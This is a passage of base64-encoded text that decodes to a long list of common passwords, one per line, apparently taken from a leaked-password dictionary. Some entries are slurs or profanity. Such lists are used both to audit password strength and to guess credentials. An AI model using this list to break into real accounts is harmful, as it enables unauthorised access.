WNsZQ0KbW9tbw0KbXVzYXNoaQ0KamFtbWluDQoyMDAzDQoyMzQ1NjcNCndwMjAwM3dwDQpzdWJtaXQNCnNpbGVuY2UNCnNzc3Nzc3MNCnN0YXRlDQpzcGlrZXMNCnNsZWVwZXINCnBhc3N3b3J0DQp0b2xlZG8NCmt1bWUNCm1lZGlhDQptZW1lDQptZWR1c2ENCm1hbnRpcw0KcmVtb3RlDQpyZWFkaW5nDQpyZWVib2sNCjEwMTcNCmFydGVtaXMNCmhhbXB0b24NCmhhcnJ5MQ0KY2FmYzkxDQpmZXR0aXNoDQpmcmllbmRseQ0Kb2NlYW5zDQpvb29vb29vbw0KbWFuZ28NCnBwcHBwDQp0cmFpbmVyDQp0cm95DQp1dXV1DQo5MDkwOTANCmNyb3NzDQpkZWF0aDENCm5ld3MNCmJ1bGxmcm9nDQpob2tpZXMNCmhvbHlzaGl0DQplZWVlZWVlDQptaXRjaA0KamFzbWluZTENCiYNCiYNCnNlcmdlYW50DQpzcGlubmVyDQpsZW9uDQpqb2NrZXkNCnJlY29yZHMNCnJpZ2h0DQpiYWJ5Ymx1ZQ0KaGFucw0KZ29vbmVyDQo0NzQ3NDcNCmNoZWVrcw0KY2Fycw0KY2FuZGljZQ0KZmlnaHQNCmdsb3cNCnBhc3MxMjM0DQpwYXJvbGENCm9rb2tvaw0KcGFibG8NCm1hZ2ljYWwNCm1ham9yDQpyYW1zZXkNCnBvc2VpZG9uDQo5ODk4OTgNCmNvbmZ1c2VkDQpjaXJjbGUNCmNydXNoZXINCmN1YnN3aW4NCm5ubm4NCmhvbGx5d29vZA0KZXJpbg0Ka290YWt1DQptaWxvDQptaXR0ZW5zDQp3aGF0c3VwDQp2dnZ2dg0KaW9tZWdhDQppbnNlcnRpb25zDQpiZW5nYWxzDQpiZXJtdWRhDQpiaWl0DQp5ZWxsb3cxDQowMTIzNDUNCnNwaWtlMQ0Kc291dGgNCnNvd2hhdA0KcGl0dXJlcw0KcGVhY29jaw0KcGVja2VyDQp0aGVlbmQNCmp1bGlldHRlDQpqaW1taWUNCnJvbWFuY2UNCmF1Z3VzdGENCmhheWFidXNhDQpoYXdrZXllcw0KY2FzdHJvDQpmbG9yaWFuDQpnZW9mZnJleQ0KZG9sbHkNCmx1bHUNCnFhejEyMw0KdXNhcm15DQp0d2lua2xlDQpjbG91ZA0KY2h1Y2tsZXMNCmNvbGQNCmhvdW5kZG9nDQpob3Zlcg0KaG90aG90DQpldXJvcGENCmVybmllDQprZW5zaGluDQprb2phaw0KbWlrZXkxDQp3YXRlcjENCjE5Njk2OQ0KYmVjYXVzZQ0Kd3JhaXRoDQp6ZWJyYQ0Kd3d3d3cNCjMzMzMzDQpzaW1vbjENCnNwaWRlcjENCnNudWZmeQ0KcGhpbGlwcGUNCnRodW5kZXJiDQp0ZWRkeTENCmxlc2xleQ0KbWFyaW5vMTMNCm1hcmlhMQ0KcmVkbGluZQ0KcmVuYXVsdA0KYWxvaGENCmFudG9pbmUNCmhhbmR5bWFuDQpjZXJiZXJ1cw0KZ2FtZWNvY2sNCmdvYnVja3MNCmZyZWVzZXgNCmR1ZmZtYW4NCm9vb29vDQpwYXBhDQpudWdnZXRzDQptYWdpY2lhbg0KbG9uZ2Jvdw0KcHJlYWNoZXINCnBvcm5vMQ0KY291bnR5DQpjaHJ5c2xlcg0KY29udGFpbnMNCmRhbGVqcg0KZGFyaXVzDQpkYXJsZW5lDQpkZWxsDQpuYXZ5DQpidWZmeTENCmhlZGdlaG9nDQpob29zaWVycw0KaG9uZXkxDQpob3R0DQpoZXloZXkNCmV1cm9wZQ0KZHV0Y2hlc3MNCmV2ZXJlc3QNCndhcmVhZ2xlDQppaGF0ZXlvdQ0Kc3VuZmxvd2UNCjM0MzQNCnNlbmF0b3JzDQpzaGFnDQpzcG9vbg0Kc29ub21hDQpzdGFsa2VyDQpwb29jaGllDQp0ZXJtaW5hbA0KdGVyZWZvbg0KbGF1cmVuY2UNCm1hcmFkb25hDQptYXJ5YW5uDQptYXJ0eQ0Kcm9tYW4NCjEwMDcNCjE0MjUzNg0KYWxpYmFiYQ0KYW1lcmljYTENCmJhcnRtYW4NCmFzdHJvDQpnb3RoDQpjZW50dXJ5DQpjaGlja2VuMQ0KY2hlYXRlcg0KZm91cg0KZ2hvc3QxDQpwYXNzcGFzcw0Kb3JhbA0KcjJkMmMzcG8NCmNpdmljDQpjaWNlcm8NCm15eHdvcmxkDQpra2traw0KbWlzc291cmkNCndpc2hib25lDQppbmZpbml0aQ0KamFtZXNvbg0KMWEyYjNjDQoxcXdlcnR5DQp3b25kZXJib3kNCnNraXANCnNob2pvdQ0Kc3RhbmZvcmQNCnNwYXJreTENCnNtZWdoZWFkDQpwb2l1eQ0KdGl0YW5pdW0NCnRvcnJlcw0KbGFudGVybg0KamVsbHkNCmplYW5uZQ0KbWVpZXINCjEyMTMNCmJheWVybg0KYmFzc2V0DQpnc3hyNzUwDQpjYXR0bGUNCmNoYXJsZW5lDQpmaXNoaW5nMQ0KZnVsbG1vb24NCmdpbGxlcw0KZGltYQ0Kb2JlbGl4DQpwb3BvDQpwcmlzc3kNCnJhbXJvZA0KdW5pcXVlDQphYnNvbHV0ZQ0KYnVtbWVyDQpob3RvbmUNCmR5bmFzdHkNCmVudHJ5DQprb255b3INCm1pc3N5MQ0KbW9zZXMNCjI4MjgyOA0KeWVhaA0KeHl6MTIzDQpzdG9wDQo0MjZoZW1pDQo0MDQwNDANCnNlaW5mZWxkDQpzaW1tb25zDQpwaW5ncG9uZw0KbGF6YXJ1cw0KbWF0dGhld3MNCm1hcmluZTENCm1hbm5pbmcNCnJlY292ZXJ5DQoxMjM0NWENCmJlYW1lcg0KYmFieWZhY2UNCmdyZWVjZQ0KZ3VzdGF2DQo3MDA3DQpjaGFyaXR5DQpjYW1pbGxhDQpjY2NjY2NjDQpmYWdnb3QNCmZveHkNCmZyb3plbg0KZ2xhZGlhdG8NCmR1Y2tpZQ0KZG9nZm9vZA0KcGFyYW5vaWQNCnBhY2tlcnMxDQpsb25nam9obg0KcmFkaWNhbA0KdHVuYQ0KY2xhcmluZXQNCmNsYXVkaW8NCmNpcmN1cw0KZGFubnkxDQpub3ZlbGwNCm5pZ2h0cw0KYm9uYm9uDQprYXNobWlyDQpraWtpDQptb3J0aW1lcg0KbW9kZWxzbmUNCm1vb25kb2cNCm1vbmFjbw0KdmxhZGltaXINCmluc2VydA0KMTk1Mw0KenhjMTIzDQpzdXByZW1lDQozMTMxDQpzZXh4eA0Kc2VsZW5hDQpzb2Z0YWlsDQpwb2lwb2kNCnBvbmcNCnRvZ2V0aGVyDQptYXJzDQptYXJ0aW4xDQpyb2d1ZQ0KYWxvbmUNCmF2YWxhbmNoDQphdWRpYTQNCjU1YmdhdGVzDQpjY2NjY2NjYw0KY2hpY2sNCmNhbWUxMQ0KZmlnYXJvDQpnZW5ldmENCmRvZ2JveQ0KZG5zYWRtDQpkaXBzaGl0DQpwYXJhZGlnbQ0Kb3RoZWxsbw0Kb3BlcmF0b3INCm9mZmljZXINCm1hbG9uZQ0KcG9zdA0KcmFmYWVsDQp2YWxlbmNpYQ0KdHJpcG9kDQpjaG9pY2UNCmNob3Bpbg0KY291Y291DQpjb2FjaA0KY29ja3N1Y2sNCmNvbW1vbg0KY3JlYXR1cmUNCmJvcnVzc2lhDQpib29rDQpicm93bmluZw0KaGVyaXRhZ2UNCmhpemlhZA0KaG9tZXJqDQplaWdodA0KZWFydGgNCm1pbGxpb25zDQptdWxsZXQNCndoaXNreQ0KamFjcXVlcw0Kc3RvcmUNCjQyNDINCnNwZWVkbw0Kc3RhcmNyYWYNCnNreWxhcg0Kc3BhY2VtYW4NCnBpZ2d5DQpwaWVyY2UNCnRpZ2VyMg0KbGVnb3MNCmxhbGENCmplemViZWwNCmp1ZHkNCmpva2VyMQ0KbWF6ZGENCmJhcnRvbg0KYmFrZXINCjcyNzI3Mg0KY2hlc3RlcjENCmZpc2htYW4NCmZvb2QNCnJycnJycnJyDQpzYW5kd2ljaA0KZHVuZGVlDQpsdW1iZXINCm1hZ2F6aW5lDQpyYWRhcg0KcHBwcHBwcA0KdHJhbm55DQphYWxpeWFoDQphZG1pcmFsDQpjb21pY3MNCmNsZW8NCmRlbGlnaHQNCmJ1dHRmdWNrDQpob21lYm95DQpldGVybmFsDQpraWxyb3kNCmtlbGxpZQ0Ka2hhbg0KdmlvbGluDQp3aW5nbWFuDQp3YWxtYXJ0DQpiaWdibHVlDQpibGF6ZQ0KYmVlbWVyDQpiZW93dWxmDQpiaWdmaXNoDQp5eXl5eXl5DQp3b29kaWUNCnllYWhiYWJ5DQowMTIzNDU2DQp0Ym9uZQ0Kc3R5bGUNCnN5enlneQ0Kc3RhcnRlcg0KbGVtb24NCmxpbmRhMQ0KbWVybG90DQptZXhpY2FuDQoxMTIzNTgxMw0KYW5pdGENCmJhbm5lcg0KYmFuZ2JhbmcNCmJhZG1hbg0KYmFyZmx5DQpncmVhc2UNCmNhcmxhDQpjaGFybGVzMQ0KZmZmZmZmZmYNCnNjcmV3DQpkb2Jlcm1hbg0KZGlhbmUNCmRvZ3NoaXQNCm92ZXJraWxsDQpjb3VudGVyDQpjb29sZ3V5DQpjbGF5bW9yZQ0KZGVtb25zDQpkZW1vDQpub21vcmUNCm5vcm1hbA0KYnJld3N0ZXINCmhoaGhoaGgNCmhvbmRhcw0KaWFtZ29kDQplbnRlcm1lDQpldmVyZXR0DQplbGVjdHJvbg0KZWFzdHNpZGUNCmtheWxhDQptaW5pbW9uaQ0KbXliYWJ5DQp3aWxkYmlsbA0Kd2lsZGNhcmQNCmlwc3dpY2gNCjIwMDAwMA0KYmVhcmNhdA0KemlnemFnDQp5eXl5eXl5eQ0KeGFuZGVyDQpzd2VldG5lcw0KMzY5MzY5DQpza3lsZXINCnNreXdhbGtlcg0KcGlnZW9uDQpwZXl0b24NCnRpcHBlcg0KbGlsbHkNCmFzZGYxMjMNCmFscGhhYmV0DQphc2R6eGMNCmJhYnliYWJ5DQpiYW5hbmUNCmJhcm5lcw0KZ3V5dmVyDQpncmFwaGljcw0KZ3JhbmQNCmNoaW5vb2sNCmZsb3JpZGExDQpmbGV4aWJsZQ0KZnVja2luc2lkZQ0Kb3Rpcw0KdXJzaXRlc3V4DQp0b3RvdG8NCnRydXN0DQp0b3dlcg0KYWRhbTEyDQpjaHJpc3RtYQ0KY29yZXkNCmNocm9tZQ0KYnVkZGllDQpib21iZXJzDQpidW5rZXINCmhpcHBpZQ0Ka2VlZ2FuDQptaXNmaXRzDQp2aWNraWUNCjI5MjkyOQ0Kd29vZmVyDQp3d3d3d3d3dw0Kc3R1YmJ5DQpzaGVlcA0Kc2VjcmV0cw0Kc3BhcnRhDQpzdGFuZw0Kc3B1ZA0Kc3BvcnR5DQpwaW5iYWxsDQpqb3JnZQ0KanVzdDRmdW4NCmpvaGFubmENCm1heHh4eA0KcmViZWNjYTENCmd1bnRoZXINCmZhdGltYQ0KZmZmZmZmZg0KZnJlZXdheQ0KZ2FyaW9uDQpzY29yZQ0KcnJycnINCnNhbmNobw0Kb3V0YmFjaw0KbWFnZ290DQpwdWRkaW4NCnRyaWFsDQphZHJpZW5uZQ0KOTg3NDU2DQpjb2x0b24NCmNseWRlDQpicmFpbg0KYnJhaW5zDQpob29wcw0KZWxlYW5vcg0KZHdheW5lDQpraXJieQ0KbXlkaWNrDQp2aWxsYQ0KMTk2OTE5NjkNCmJpZ2NhdA0KYmVja2VyDQpzaGluZXINCnNpbHZlcmFkDQpzcGFuaXNoDQp0ZW1wbGFyDQpsYW1lcg0KanVpY3kNCm1hcnNoYQ0KbWlrZTENCm1heGltdW0NCnJoaWFubm9uDQpyZWFsDQoxMjIzDQoxMDEwMTAxMA0KYXJyb3dzDQphbmRyZXMNCmFsdWNhcmQNCmJhbGR3aW4NCmJhcm9uDQphdmVudWUNCmFzaGxlaWdoDQpoYWdnaXMNCmNoYW5uZWwNCmNoZWVjaA0Kc2FmYXJpDQpyb3NzDQpkb2cxMjMNCm9yaW9uMQ0KcGFsb21hDQpxd2VyYXNkZg0KcHJlc2lkZW4NCnZlZ2l0dG8NCnRyZWVzDQo5Njk2OTYNCmFkb25pcw0KY29sb25lbA0KY29va2llMQ0KbmV3eW9yazENCmJyaWdpdHRlDQpidWRkeWJveQ0KaGVsbG9zDQpoZWluZWtlbg0KZHdpZ2h0DQplcmFzZXINCmtlcnN0aW4NCm1vdGlvbg0KbW9yaXR6DQptaWxsd2FsbA0KdmlzdWFsDQpqYXliaXJkDQoxOTgzDQpiZWF1dGlmdQ0KYml0dGVyDQp5dmV0dGUNCnpvZGlhYw0Kc3RldmVuMQ0Kc2luaXN0ZXINCnNsYW1tZXINCnNtYXNoaW5nDQpzbGljazENCnNwb25nZQ0KdGVkZHliZWENCnRoZWF0ZXINCnRoaXMNCnRpY2tsaXNoDQpsaXBzdGljaw0Kam9ubnkNCm1hc3NhZ2UNCm1hbm4NCnJleW5vbGRzDQpyaW5nDQoxMjExDQphbWF6aW5nDQphcHRpdmENCmFwcGxlcGllDQpiYWlsZXkxDQpndWl0YXIxDQpjaGFuZWwNCmNhbnlvbg0KZ2FnZ2VkDQpmdWNrbWUxDQpyb3VnaA0KZGlnaXRhbDENCmRpbm9zYXVyDQpwdW5rDQo5ODc2NQ0KOTAyMTANCmNsb3ducw0KY3Vicw0KZGFuaWVscw0KZGVlamF5DQpuaWdnYQ0KbmFydXRvDQpib3hjYXINCmljZWhvdXNlDQpob3R0aWVzDQplbGVjdHJhDQprZW50DQp3aWRnZXQNCmluZGlhDQppbnNhbml0eQ0KMTk4Ng0KMjAwNA0KYmVzdA0KYmx1ZWZpc2gNCmJpbmdvMQ0KKioqKioNCnN0cmF0dXMNCnN0cmVuZ3RoDQpzdWx0YW4NCnN0b3JtMQ0KNDQ0NDQNCjQyMDANCnNlbnRuZWNlDQpzZWFzb24NCnNleHlib3kNCnNpZ21hDQpzbW9raWUNCnNwYW0NCnBvaW50DQpwaXBwbw0KdGlja2V0DQp0ZW1wcGFzcw0Kam9lbA0KbWFubWFuDQptZWRpY2luZQ0KMTAyMg0KYW50b24NCmFsbW9uZA0KYmFjY2h1cw0KYXp0bm0NCmF4aW8NCmF3ZnVsDQpiYW1ib28NCmhha3INCmdyZWdvcg0KaGFoYWhhaGENCjU2NzgNCmNhc2Fub3ZhDQpjYXByaWNlDQpjYW1lcm8xDQpmZWxsb3cNCmZvdW50YWluDQpkdXBvbnQNCmRvbHBoaW4xDQpkaWFubmUNCnBhZGRsZQ0KbWFnbmV0DQpxd2VydDENCnB5b24NCnBvcnNjaGUxDQp0cmlwcGVyDQp2YW1waXJlcw0KY29taW5nDQpub3dheQ0KYnVycml0bw0KYm96bw0KaGlnaGhlZWwNCmh1Z2hlcw0KaG9va2VtDQplZGRpZTENCmVsbGllDQplbnRyb3B5DQpra2tra2traw0Ka2tra2traw0KaWxsaW5vaXMNCmphY29icw0KMTk0NQ0KMTk1MQ0KMjQ2ODANCjIxMjEyMTIxDQoxMDAwMDANCnN0b25lY29sZA0KdGFjbw0Kc3ViemVybw0Kc2hhcnANCnNleHh4eQ0Kc2tvbGtvDQpzaGFubmENCnNreWhhd2sNCnNwdXJzMQ0Kc3B1dG5paw0KcGlhenphDQp0ZXN0cGFzcw0KbGV0dGVyDQpsYW5lDQprdXJ0DQpqaWdnYW1hbg0KbWF0aWxkYQ0KMTIyNA0KaGFydmFyZA0KaGFubmFoMQ0KNTI1MjUyDQo0ZXZlcg0KY2FyYm9uDQpjaGVmDQpmZWRlcmljbw0KZ2hvc3RzDQpnaW5hDQpzY29ycGlvMQ0KcnQ2eXRlcmUNCm1hZGlzb24xDQpsb2tpDQpyYXF1ZWwNCnByb21pc2UNCmNvb2xuZXNzDQpjaHJpc3RpbmENCmNvbGRiZWVyDQpjaXRhZGVsDQpicml0dG5leQ0KaGlnaHdheQ0KZXZpbA0KbW9uYXJjaA0KbW9yZ2FuMQ0Kd2FzaGluZ3QNCjE5OTcNCmJlbGxhMQ0KYmVycnkNCnlheWENCnlvbGFuZGENCnN1cGVyYg0KdGF4bWFuDQpzdHVkbWFuDQpzdGVwaGFuaWUNCjM2MzYNCnNoZXJyaQ0Kc2hlcmlmZg0Kc2hlcGhlcmQNCnBvbGFuZA0KcGl6emFzDQp0aWZmYW55MQ0KdG9pbGV0DQpsYXRpbmENCmxhc3NpZQ0KbGFycnkxDQpqb3NlcGgxDQptZXBoaXN0bw0KbWVhZ2FuDQptYXJpYW4NCnJlcHRpbGUNCnJpY28NCnJhem9yDQoxMDEzDQpiYXJyb24NCmhhbW1lcjENCmd5cHN5DQpncmFuZGUNCmNhcnJvbGwNCmNhbXBlcg0KY2hpcHB5DQpjYXQxMjMNCmNhbGwNCmNoaW1lcmENCmZpZXN0YQ0KZ2xvY2sNCmdsZW5uDQpkb21haW4NCmRpZXRlcg0KZHJhZ29uYmENCm9uZXR3bw0KbnlnaWFudHMNCm9kZXNzYQ0KcGFzc3dvcmQyDQpsb3VpZQ0KcXVhcnR6DQpwcm93bGVyDQpwcm9waGV0DQp0b3dlcnMNCnVsdHJhDQpjb2NrZXINCmNvcmxlb25lDQpkYWtvdGExDQpjdW1tDQpubm5ubm5uDQpuYXRhbGlhDQpib3hlcnMNCmh1Z28NCmhleW5vdw0KaG9sbG93DQppY2ViZXJnDQplbHZpcmENCmtpdHR5a2F0DQprYXRlDQpraXRjaGVuDQp3YXNhYmkNCnZpa2luZ3MxDQppbXBhY3QNCmJlZXJtYW4NCnN0cmluZw0Kc2xlZXANCnNwbGludGVyDQpzbm9vcHkxDQpwaXBlbGluZQ0KcG9ja2V0DQpsZWdzDQptYXBsZQ0KbWlja2V5MQ0KbWFudWVsYQ0KbWVybWFpZA0KbWljcm8NCm1lb3dtZW93DQpyZWRiaXJkDQphbGlzaGENCmJhdXJhDQpiYXR0ZXJ5DQpncmFzcw0KY2hldnlzDQpjaGVzdG51dA0KY2FyYXZhbg0KY2FyaW5hDQpjaGFybWVkDQpmcmFzZXINCmZyb2dtYW4NCmRpdmluZw0KZG9nZ2VyDQpkcmF2ZW4NCmRyaWZ0ZXINCm9hdG1lYWwNCnBhcmlzMQ0KbG9uZ2RvbmcNCnF1YW50NDMwN3MNCnJhY2hlbDENCnZlZ2l0dGENCmNvbGUNCmNvYnJhcw0KY29yc2Fpcg0KZGFkYWRhDQpub2VsbGUNCm15bGlmZQ0KbmluZQ0KYm93d293DQpib2R5DQpob3RyYXRzDQplYXN0d29vZA0KbW9vbmxpZ2gNCm1vZGVuYQ0Kd2F2ZQ0KaWxsdXNpb24NCmlpaWlpaWkNCmpheWhhd2tzDQpiaXJnaXQNCnpvbmUNCnN1dHRvbg0Kc3VzYW5hDQpzd2luZ2Vycw0Kc2hvY2tlcg0Kc2hyaW1wDQpzZXhnb2QNCnNxdWFsbA0Kc3RlZmFuaWUNCnNxdWVlemUNCnNvdWwNCnBhdHJpY2UNCnBvaXUNCnBsYXllcnMNCnRpZ2VyczENCnRvZWphbQ0KdGlja2xlcg0KbGluZQ0KanVsaWUxDQpqaW1ibzENCmplZmZlcnNvDQpqdWFuaXRhDQptaWNoYWVsMg0Kcm9kZW8NCnJvYm90DQoxMDIzDQphbm5pZTENCmJiYWxsDQpndWVzcw0KaGFwcHkyDQpjaGFydGVyDQpmYXJtDQpmbGFzaGVyDQpmYWxjb24xDQpmaWN0aW9uDQpmYXN0YmFsbA0KZ2FkZ2V0DQpzY3JhYmJsZQ0KZGlhcGVyDQpkaXJ0YmlrZQ0KZGlubmVyDQpvbGl2ZXIxDQpwYXJ0bmVyDQpwYWNvDQpsdWNpbGxlDQptYWNtYW4NCnBvb3B5DQpwb3BwZXINCnBvc3RtYW4NCnR0dHR0dHQNCnVyc3VsYQ0KYWN1cmENCmNvd2JveTENCmNvbmFuDQpkYWV3b28NCmN5cnVzDQpjdXN0b21lcg0KbmF0aW9uDQpuZW1yYWM1OA0Kbm5ubm4NCm5leHRlbA0KYm9sdG9uDQpib2JkeWxhbg0KaG9wZWxlc3MNCmV1cmVrYQ0KZXh0cmENCmtpbW1pZQ0Ka2NqOXd4NW4NCmtpbGxiaWxsDQptdXNpY2ENCnZvbGtzd2FnDQp3YWdlDQp3aW5kbWlsbA0Kd2VydA0KdmludGFnZQ0KaWxvdmV5b3UxDQppdHNtZQ0KYmVzc2llDQp6aXBwbw0KMzExMzExDQpzdGFybGlnaA0Kc21va2V5MQ0Kc3BvdA0Kc25hcHB5DQpzb3VsbWF0ZQ0KcGxhc21hDQp0aGVsbWENCnRvbmlnaHQNCmtydXN0eQ0KanVzdDRtZQ0KbWNkb25hbGQNCm1hcml1cw0Kcm9jaGVsbGUNCnJlYmVsMQ0KMTEyMw0KYWxmcmVkbw0KYXVicmV5DQphdWRpDQpjaGFudGFsDQpmaWNrDQpnb2F3YXkNCnJvc2VzDQpzYWxlcw0KcnVzdHkyDQpkaXJ0DQpkb2dib25lDQpkb29mdXMNCm9vb29vb28NCm9ibGl2aW9uDQptYW5raW5kDQpsdWNrDQptYWhsZXINCmxsbGxsbGwNCnB1bXBlcg0KcHVjaw0KcHVsc2FyDQp2YWxreXJpZQ0KdHVwYWMNCmNvbXBhc3MNCmNvbmNvcmRlDQpjb3N0ZWxsbw0KY291Z2Fycw0KZGVsYXdhcmUNCm5pY2VndXkNCm5vY3R1cm5lDQpib2IxMjMNCmJvYXRpbmcNCmJyb256ZQ0KaG9wa2lucw0KaGVyZXdlZ28NCmhld2xldHQNCmhvdWhvdQ0KaHViZXJ0DQplYXJuaGFyZA0KZWVlZWVlZWUNCmtlbGxlcg0KbWluZ3VzDQptb2J5ZGljaw0KdmVudHVyZQ0KdmVyaXpvbg0KaW1hdGlvbg0KMTk1MA0KMTk0OA0KMTk0OQ0KMjIzMzQ0DQpiaWdiaWcNCmJsb3Nzb20NCnphY2sNCndvd3dvdw0Kc2lzc3kNCnNraW5uZXINCnNwaWtlcg0Kc3F1YXJlDQpzbm9va2VyDQpzbHVnZ28NCnBsYXllcjENCmp1bmsNCmplYW5uaWUNCmpzYmFjaA0KanVtYm8NCmpld2VsDQptZWRpYw0Kcm9iaW5zDQpyZWRkZXZpbA0KcmVja2xlc3MNCjEyMzQ1NmENCjExMjUNCjEwMzENCmJlYWNvbg0KYXN0cmENCmd1bWJ5DQpoYW1tb25kDQpoYXNzYW4NCjc1NzU3NQ0KNTg1ODU4DQpjaGlsbGluDQpmdWNrMQ0Kc2FuZGVyDQpsb3dlbGwNCnJhZGlvaGVhDQp1cHlvdXJzDQp0cmVrDQpjb3VyYWdlDQpjb29sY29vbA0KY2xhc3NpY3MNCmNob29jaG9vDQpkYXJyeWwNCm5pa2tpMQ0Kbml0cm8NCmJ1Z3MNCmJveXRveQ0KZWxsZW4NCmV4Y2l0ZQ0Ka2lyc3R5DQprYW5lDQp3aW5nbnV0DQp3aXJlbGVzcw0KaWN1ODEyDQoxbWFzdGVyDQpiZWF0bGUNCmJpZ2Jsb2NrDQpibGFuY2ENCndvbGZlbg0Kc3VtbWVyOTkNCnN1Z2FyMQ0KdGFydGFyDQpzZXh5c2V4eQ0Kc2VubmENCnNleG1hbg0Kc2ljaw0Kc29tZW9uZQ0Kc29wcmFubw0KcGlwcGluDQpwbGF0eXB1cw0KcGl4aWVzDQp0ZWxlcGhvbg0KbGFuZA0KbGF1cmExDQpsYXVyZW50DQpyaW1tZXINCnJvYWQNCnJlcG9ydA0KMTAyMA0KMTJxd2FzengNCmFydHVybw0KYXJvdW5kDQpoYW1pc2gNCmhhbGlmYXgNCmZpc2hoZWFkDQpmb3J1bQ0KZG9kb2RvDQpkb2l0DQpvdXRzaWRlDQpwYXJhbWVkaQ0KbG9uZXNvbWUNCm1hbmR5MQ0KdHdpc3QNCnV1dXV1DQp1cmFudXMNCnR0dHR0DQpidXRjaGVyDQpicnVjZTENCmhlbHBlcg0KaG9wZWZ1bA0KZWR1YXJkDQpkdXN0eTENCmthdGh5MQ0Ka2F0aGVyaW4NCm1vb25iZWFtDQptdXNjbGVzDQptb25zdGVyMQ0KbW9ua2V5Ym8NCm1vcnRvbg0Kd2luZHN1cmYNCnZ2dnZ2dnYNCnZpdmlkDQppbnN0YWxsDQoxOTQ3DQoxODcxODcNCjE5NDENCjE5NTINCnRhdGlhbmENCnN1c2FuMQ0KMzE0MTU5MjYNCnNpbm5lZA0Kc2V4eHkNCnNlbmF0b3INCnNlYmFzdGlhbg0Kc2hhZG93cw0Kc21vb3RoaWUNCnNub3dmbGFrDQpwbGF5c3RhdA0KcGxheWENCnBsYXlib3kxDQp0b2FzdGVyDQpqZXJyeTENCm1hcmllMQ0KbWFzb24xDQptZXJsaW4xDQpyb2dlcjENCnJvYWRzdGVyDQoxMTIzNTgNCjExMjENCmFuZHJlYTENCmJhY2FyZGkNCmF1dG8NCmhhcmR3YXJlDQpoYXJkeQ0KNzg5Nzg5DQo1NTU1NTU1DQpjYXB0YWluMQ0KZmxvcmVzDQpmZXJndXMNCnNhc2NoYQ0KcnJycnJycg0KZG9tZQ0Kb25pb24NCm51dHRlcg0KbG9sb2xvDQpxcXFxcXFxDQpxdWljaw0KdW5kZXJ0YWsNCnV1dXV1dXV1DQp1dXV1dXV1DQpjcmltaW5hbA0KY29iYWluDQpjaW5keTENCmNvb3JzDQpkYW5pDQpkZXNjZW50DQpuaW1idXMNCm5vbWFkDQpuYW5vb2sNCm5vcndpY2gNCmJvbWINCmJvbWJheQ0KYnJva2VyDQpob29rdXANCmtpd2kNCndpbm5lcnMNCmphY2twb3QNCjFhMmIzYzRkDQoxNzc2DQpiZWFyZG9nDQpiaWdoZWFkDQpibGFzdA0KYmlyZDMzDQowOTg3DQpzdHJlc3MNCnNob3QNCnNwb29nZQ0KcGVsaWNhbg0KcGVlcGVlDQpwZXJyeQ0KcG9pbnRlcg0KdGl0YW4NCnRoZWRvb3JzDQpqZXJlbXkxDQphbm5hYmVsbA0KYWx0aW1hDQpiYWJhDQpoYWxsaWUNCmhhdGUNCmhhcmRvbmUNCjU0NTQNCmNhbmRhY2UNCmNhdHdvbWFuDQpmbGlwDQpmYWl0aGZ1bA0KZmluYW5jZQ0KZmFybWJveQ0KZmFyc2NhcGUNCmdlbmVzaXMxDQpzYWxvbW9uDQpkZXN0cm95DQpwYXBlcnMNCm9wdGlvbg0KcGFnZQ0KbG9zZXIxDQpsb3Bleg0KcjJkMg0KcHVtcGtpbnMNCnRyYWluaW5nDQpjaHJpc3MNCmN1bWN1bQ0KbmluamFzDQpuaW5qYTENCmh1bmcNCmVyaWthDQplZHVhcmRvDQpraWxsZXJzDQptaWxsZXIxDQppc2xhbmRlcg0KamFtZXNib25kDQppbnRlbA0KamFydmlzDQoxOTg0MTk4NA0KMjYyNg0KYml6emFyZQ0KYmx1ZTEyDQpiaWtlcg0KeW95b21hDQpzdXNoaQ0Kc3R5bGVzDQpzaGl0ZmFjZQ0Kc2VyaWVzDQpzaGFudGkNCnNwYW5rZXINCnN0ZWZmaQ0Kc21hcnQNCnNwaGlueA0KcGxlYXNlMQ0KcGF1bGllDQpwaXN0b25zDQp0aWJ1cm9uDQpsaW1pdGVkDQptYXh3ZWxsMQ0KbWRvZ2cNCnJvY2tpZXMNCmFybXN0cm9uDQphbGV4aWENCmFybGVuZQ0KYWxlamFuZHINCmFyY3RpYw0KYmFuZ2VyDQphdWRpbw0KYXNpbW92DQphdWd1c3R1cw0KZ3JhbmRwYQ0KNzUzOTUxDQo0eW91DQpjaGlsbHkNCmNhcmUxODM5DQpjaGFwbWFuDQpmbHlmaXNoDQpmYW50YXNpYQ0KZnJlZWZhbGwNCnNhbnRhDQpzYW5kcmluZQ0Kb3Jlbw0Kb2hzaGl0DQptYWNiZXRoDQptYWRjYXQNCmxvdmV5YQ0KbWFsbG9yeQ0KcmFnZQ0KcXVlbnRpbg0KcXdlcnF3ZXINCnByb2plY3QNCnJhbWlyZXoNCmNvbG5hZ28NCmNpdGl6ZW4NCmNob2NoYQ0KY29iYWx0DQpjcnlzdGFsMQ0KZGFiZWFycw0KbmV2ZXRzDQpuaW5laW5jaA0KYnJvbmNvczENCmhlbGVuZQ0KaHVnZQ0KZWRnYXINCmVwc2lsb24NCmVhc3Rlcg0Ka2VzdHJlbA0KbW9yb24NCnZpcmdpbA0Kd2luc3RvbjENCndhcnJpb3IxDQppaWlpaWlpaQ0KaWxvdmV5b3UyDQoxNjE2DQpiZWF0DQpiZXR0aW5hDQp3b293b28NCnphbmRlcg0Kc3RyYWlnaHQNCnNob3dlcg0Kc2xvcHB5DQpzcGVjaWFsaw0KdGlua2VyYmUNCmplbGx5YmVhDQpyZWFkZXINCnJvbWVybw0KcmVkc294MQ0KcmlkZQ0KMTIxNQ0KMTExMg0KYW5uaWthDQphcmNhZGlhDQphbnN3ZXINCmJhZ2dpbw0KYmFzZQ0KZ3VpZG8NCjU1NTY2Ng0KY2FybWVsDQpjYXltYW4NCmNicjkwMHJyDQpjaGlwcw0KZ2FicmllbGwNCmdlcnRydWRlDQpnbGVubndlaQ0Kcm94eQ0Kc2F1c2FnZXMNCmRpc2NvDQpwYXNzMQ0KbHVuYQ0KbG92ZWJ1Zw0KbWFjbWFjDQpxdWVlbmllDQpwdWZmaW4NCnZhbmd1YXJkDQp0cmlwDQp0cmluaXRybw0KYWlyd29sZg0KYWJib3R0DQphYWExMTENCmNvY2FpbmUNCmNpc2NvDQpjb3R0YWdlDQpkYXl0b24NCmRlYWRseQ0KZGF0c3VuDQpicmlja3MNCmJ1bXBlcg0KZWxkb3JhZG8NCmtpZHJvY2sNCndpemFyZDENCndoaXNrZXJzDQp3aW5kDQp3aWxkd29vZA0KaXN0aGVtYW4NCmludGVyZXN0DQppdGFseQ0KMjU4MD